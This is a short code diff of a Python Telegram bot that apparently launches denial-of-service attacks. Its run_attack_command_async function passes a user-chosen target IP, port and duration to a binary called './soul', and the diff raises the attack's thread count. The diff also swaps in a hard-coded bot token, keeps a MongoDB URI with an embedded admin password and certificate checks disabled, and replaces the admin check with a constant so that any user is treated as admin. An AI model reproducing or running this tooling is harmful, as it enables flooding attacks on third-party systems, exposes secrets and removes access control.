@@ -16,7 +16,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7257260356:AAGW27fQvkCJvxLQfERyRd2Ts-KhWjRD2oU'
+TOKEN = '2107166346:AAGJjkFnjHNgPlSJp_jzGx4oZ3pdjV9JRGM'
 MONGO_URI = 'mongodb+srv://admin:kpR4ObsewTySq48I@test.zeqrmgb.mongodb.net/test_db?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
 FORWARD_CHANNEL_ID = -100
 CHANNEL_ID = -100
@@ -84,7 +84,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 60")
+    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 200")
     await process.communicate()
 
 def is_user_admin(user_id, chat_id):
@@ -97,7 +97,7 @@ def is_user_admin(user_id, chat_id):
 def approve_or_disapprove_user(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
-    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    is_admin = 1334499769
     cmd_parts = message.text.split()
 
     if not is_admin:
